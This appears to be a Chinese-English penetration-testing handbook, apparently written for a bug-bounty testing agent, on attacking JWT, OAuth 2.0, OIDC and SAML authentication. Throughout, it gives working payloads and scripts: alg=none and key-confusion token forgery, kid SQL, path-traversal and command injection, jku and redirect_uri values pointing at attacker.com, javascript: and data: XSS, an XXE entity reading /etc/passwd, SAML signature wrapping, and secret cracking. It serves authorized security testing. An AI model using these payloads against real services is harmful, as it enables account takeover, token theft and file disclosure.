> 结构：上半原有是主线（JWT / OAuth / SAML）；下半补充按 api-auth / jwt-oauth / oidc / saml 加深。标题搜即可。
>
> 跨域读 token：SRC 不挖 CORS，**勿开** `cors-test.md`。有跨站写走 `csrf-test.md`，有越权读走 `idor-test.md`。

## 一、原有knowledge-base

# OAuth/JWT/SAML 安全测试手册

## 一、JWT 测试

### 1.1 算法混淆攻击

```python
import jwt
import base64

# 原始 JWT
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"

# 攻击 1: alg=none（去除签名）
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}
fake_token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
             base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'

# 攻击 2: RS256 → HS256（用公钥作为 HMAC 密钥）
# 1. 获取公钥（从 /jwks.json 或证书）
# 2. 用公钥作为 HS256 的密钥签名
public_key = open('public.pem', 'rb').read()
fake_token = jwt.encode({"user": "admin"}, public_key, algorithm='HS256')
```

### 1.2 密钥爆破

```bash
# jwt_tool 爆破
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat 爆破
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

### 1.3 kid 注入

```python
# kid (Key ID) 参数可能存在注入
# SQL 注入
header = {
    "alg": "HS256",
    "kid": "1' UNION SELECT 'secret'--"
}

# 路径遍历
header = {
    "alg": "HS256",
    "kid": "../../../../../../dev/null"  # 空文件作为密钥
}

# 命令注入
header = {
    "alg": "HS256",
    "kid": "key.txt; whoami"
}
```

### 1.4 jku/x5u 头部篡改

```python
# jku: JWK Set URL（指向攻击者服务器）
header = {
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json",
    "kid": "attacker-key"
}

# 攻击者服务器上的 jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "...",  # 攻击者的公钥
      "e": "AQAB"
    }
  ]
}

# 用攻击者私钥签名 JWT
```

### 1.5 exp 过期时间篡改

```python
import jwt
import time

# 修改 exp 为未来时间
payload = {
    "user": "admin",
    "exp": int(time.time()) + 86400 * 365  # 1年后过期
}

# 如果服务端不验证签名，直接修改 payload
```

### 1.6 签名剥离

```bash
# 去除签名部分，只保留 header.payload.
# 部分实现可能不检查签名是否存在

# 原始: eyJhbGci...header.eyJ1c2Vy...payload.c2lnbmF0dXJl...signature
# 修改: eyJhbGci...header.eyJ1c2Vy...payload.
```

---

## 二、OAuth 2.0 测试

### 2.1 redirect_uri 绕过

```bash
# 原始授权 URL
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=read

# 绕过方法 1: 子目录
redirect_uri=https://target.com/callback/../../attacker.com

# 绕过方法 2: 子域名
redirect_uri=https://attacker.target.com/callback

# 绕过方法 3: 参数污染
redirect_uri=https://target.com/callback?next=https://attacker.com

# 绕过方法 4: 开放重定向链
redirect_uri=https://target.com/redirect?url=https://attacker.com

# 绕过方法 5: 域名混淆
redirect_uri=https://target.com.attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com%2eattacker.com

# 绕过方法 6: 协议混淆
redirect_uri=javascript:alert(document.domain)
redirect_uri=data:text/html,<script>alert(1)</script>
```

### 2.2 state 参数测试

```bash
# 测试 1: state 参数缺失
# 去掉 state 参数，观察是否仍能完成授权 → CSRF 风险

# 测试 2: state 可预测
# 多次授权，观察 state 是否有规律（递增、时间戳等）

# 测试 3: state 重放
# 使用已用过的 state 再次授权
```

### 2.3 授权码重放

```bash
# 1. 完成一次授权，获取 code
# 2. 用 code 换取 access_token
# 3. 再次用同一 code 换取 token
# 如果成功 → 授权码可重放

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=USED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback"
```

### 2.4 scope 提升

```bash
# 请求时 scope=read
# 授权后修改 code 换 token 时的 scope

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback" \
  -d "scope=read write admin"  # 提升权限
```

### 2.5 隐式授权流 token 泄露

```bash
# Implicit Flow 直接在 URL fragment 返回 token
https://target.com/callback#access_token=TOKEN&token_type=Bearer

# 风险:
# 1. Referer 泄露（访问外部链接时）
# 2. 浏览器历史记录
# 3. 日志记录

# 测试: 在回调页面插入外部资源
<img src="https://attacker.com/log">
# 检查 attacker.com 日志是否收到 Referer 含 token
```

### 2.6 PKCE 缺失测试

```bash
# PKCE (Proof Key for Code Exchange) 用于防止授权码拦截

# 测试: 不发送 code_challenge 和 code_verifier
# 1. 授权时不带 code_challenge
# 2. 换 token 时不带 code_verifier
# 如果仍能成功 → 未强制 PKCE
```

### 2.7 client_secret 泄露

```bash
# 检查 JS 源码
grep -r "client_secret" *.js
grep -r "clientSecret" *.js

# 检查移动端 APK
apktool d app.apk
grep -r "client_secret" app/

# 检查 Git 历史
git log -p | grep -i "client_secret"
```

---

## 三、SAML 测试

### 3.1 签名绕过（XML 签名包装攻击）

```xml
<!-- 原始 SAML Response -->
<samlp:Response>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- 攻击: 插入恶意 Assertion -->
<samlp:Response>
  <Assertion ID="evil">
    <Subject>
      <NameID>attacker@example.com</NameID>
    </Subject>
  </Assertion>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- 如果应用读取第一个 Assertion 但验证第二个签名 → 绕过 -->
```

### 3.2 断言篡改

```xml
<!-- 修改 NameID -->
<NameID>admin@example.com</NameID>

<!-- 修改属性 -->
<Attribute Name="role">
  <AttributeValue>admin</AttributeValue>
</Attribute>

<!-- 修改过期时间 -->
<Conditions NotBefore="2020-01-01" NotOnOrAfter="2030-01-01">
```

### 3.3 XXE 注入

```xml
<!-- SAML 请求中注入 XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest>
  <Issuer>&xxe;</Issuer>
</samlp:AuthnRequest>
```

### 3.4 注释注入截断

```xml
<!-- 利用 XML 注释截断签名验证 -->
<NameID>victim@example.com<!--</NameID>
<NameID>attacker@example.com</NameID>-->
```

---

## 四、测试工具

### jwt_tool

```bash
# 安装
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py -h

# 扫描所有漏洞
python3 jwt_tool.py <JWT> -M at

# 爆破密钥
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# 篡改 payload
python3 jwt_tool.py <JWT> -T
```

### Burp 插件

```
- JSON Web Tokens (JWT4B)
- SAML Raider
- OAuth Scanner
```

### Python 脚本示例

```python
import requests
import jwt

# JWT 测试
def test_jwt_none_alg(token):
    """测试 alg=none 攻击"""
    header, payload, sig = token.split('.')
    
    # 解码 payload
    import base64, json
    payload_data = json.loads(base64.urlsafe_b64decode(payload + '=='))
    
    # 构造 alg=none token
    new_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).decode().rstrip('=')
    
    fake_token = f"{new_header}.{new_payload}."
    
    # 测试
    r = requests.get("https://target.com/api/me",
                     headers={"Authorization": f"Bearer {fake_token}"})
    return r.status_code == 200

# OAuth redirect_uri 测试
def test_redirect_uri_bypass(auth_url, payloads):
    """测试 redirect_uri 绕过"""
    for payload in payloads:
        test_url = auth_url.replace(
            "redirect_uri=https://target.com/callback",
            f"redirect_uri={payload}"
        )
        print(f"测试: {payload}")
        # 手动访问 test_url 观察是否跳转到攻击者域名
```

---

## 二、补充：api-auth-and-jwt-abuse

### api-auth-and-jwt-abuse

### API Auth and JWT Abuse — Token Trust, Header Tricks, and Rate Limits

## 1. TOKEN TRIAGE

Inspect:

- `alg`, `kid`, `jku`, `x5u`
- role, org, tenant, scope, or privilege claims
- issuer and audience mismatches
- reuse of mobile and web tokens across products

## 2. QUICK ATTACK PICKS

| Pattern | First Test |
|---|---|
| `alg:none` acceptance | unsigned token with trailing dot |
| RS256 confusion | switch to HS256 using public key as secret |
| `kid` lookup trust | path traversal or injection in `kid` |
| remote key fetch trust | attacker-controlled `jku` or `x5u` |
| weak secret | offline crack with targeted wordlists |

## 3. HIDDEN FIELDS AND BATCH ABUSE

### Mass assignment field picks

```text
role
isAdmin
admin
verified
plan
tier
permissions
org
owner
```

### Rate limit and batch abuse picks

```text
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
Forwarded: for=9.9.9.9
```

GraphQL or JSON batch abuse candidates:

- arrays of login mutations
- bulk object fetches with varying IDs
- repeated password reset or verification calls in one request

## 4. RATE LIMIT BYPASS FAMILIES

```text
X-Forwarded-For
X-Real-IP
Forwarded
User-Agent rotation
Path case / slash variants
```

## 5. NEXT ROUTING

- For GraphQL batching and hidden parameters: [graphql and hidden parameters](graphql-test.md)
- For default credential and brute-force planning: [authentication bypass](authbypass-test.md)
- For full JWT and OAuth depth: [jwt oauth token attacks](oauth-jwt-test.md)
- For OAuth or OIDC configuration flaws in browser and SSO flows: [oauth oidc misconfiguration](oauth-jwt-test.md)
- 跨域读 token：SRC 不挖 CORS，**勿开** `cors-test.md`。有跨站写走 `csrf-test.md`，有越权读走 `idor-test.md`

---

## 补充：oauth-jwt-test

### oauth-jwt-test

### JWT and OAuth 2.0 Token Attacks


## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
### → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
### → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
### Burp JWT Editor / python-jwt attack:
### Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

### Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
### OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
### → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
### Step 1: Obtain public key (PEM format)
### From: /api/.well-known/jwks.json → convert to PEM
### From: /certs endpoint
### From: OpenSSL extraction from HTTPS cert

### Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

### Step 3: Manually:
### Modify header: {"alg":"HS256","typ":"JWT"}
### Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
### hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

### john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

### jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
### Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

### Create JWKS:
python3 -c "
import json, base64, struct
### ... (use python-jwcrypto or jwt_tool to export JWKS)
"

### Host malicious JWKS at attacker.com/malicious-jwks.json
### Sign JWT with attacker's private key
### Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ 用户给的会话禁止调 logout，不测「退出后会话还在」。自己注册/匿名建的测试号可以测退出后票是否失效
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```

---

## 补充：oauth-jwt-test

### oauth-jwt-test

### OAuth and OIDC Misconfiguration — Redirects, PKCE, Scopes, and Token Binding

## 1. WHEN TO LOAD THIS SKILL

Load when:

- The app supports `Login with Google`, GitHub, Microsoft, Okta, or other IdPs
- You see `authorize`, `callback`, `redirect_uri`, `code`, `state`, `nonce`, or `code_challenge`
- Mobile or SPA clients rely on OAuth or OIDC flows

For token cryptography and JWT header abuse, also load:

- [jwt oauth token attacks](oauth-jwt-test.md)

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| `state` handling | missing, static, predictable, or not bound to user session |
| `redirect_uri` validation | prefix match, open redirect chaining, path confusion, localhost leftovers |
| PKCE | missing for public clients, code verifier not enforced, downgraded flow |
| OIDC `nonce` | missing or not validated on ID token return |
| token audience and issuer | weak `aud` / `iss` checks, cross-client token reuse |
| account binding | callback binds attacker identity to victim session |
| scope handling | broader scopes granted than the user or client should receive |

## 3. QUICK TRIAGE

1. Map the full flow: authorize, callback, token exchange。用户给的会话不要测登出。
2. Replay callback flows with altered `state`, `nonce`, and `redirect_uri`.
3. Compare SPA, mobile, and web clients for weaker validation.
4. Check whether one provider account can be rebound to another local account.

## 4. RELATED ROUTES

- 跨域读 token：SRC 不挖 CORS，**勿开** `cors-test.md`。有跨站写走 `csrf-test.md`，有越权读走 `idor-test.md`
- XML federation or enterprise SSO: [saml sso assertion attacks](oauth-jwt-test.md)
- CSRF-heavy login or binding bugs: [csrf cross site request forgery](csrf-test.md)

---

## 补充：saml-sso-assertion-attacks

### saml-sso-assertion-attacks

### SAML SSO and Assertion Attacks — Signature Validation, Binding, and Trust Confusion

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Enterprise SSO uses SAML requests or responses
- You see `SAMLRequest`, `SAMLResponse`, XML assertions, or ACS endpoints
- Login flows involve an external IdP and browser POST/redirect binding

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| signature validation | unsigned assertion accepted, wrong node signed, signature wrapping |
| audience and recipient | weak `Audience`, `Recipient`, `Destination`, or ACS validation |
| issuer trust | wrong IdP accepted or multi-tenant issuer confusion |
| replay and freshness | missing `InResponseTo`, weak `NotBefore` / `NotOnOrAfter` enforcement |
| account mapping | email-only binding, case folding, unverified attributes |
| XML parser behavior | XXE-like parser issues or unsafe transforms around SAML documents |

## 3. QUICK TRIAGE

1. Capture one full login round trip.
2. Inspect which XML nodes are signed and which attributes drive account binding.
3. Compare SP-initiated and IdP-initiated flows.
4. Test replay, altered attributes, and assertion placement confusion.

## 4. RELATED ROUTES

- XML parser attack depth: [xxe xml external entity](xxe-test.md)
- OAuth or OIDC SSO alternatives: [oauth oidc misconfiguration](oauth-jwt-test.md)
- Auth boundary issues after SSO: [authbypass authentication flaws](authbypass-test.md)
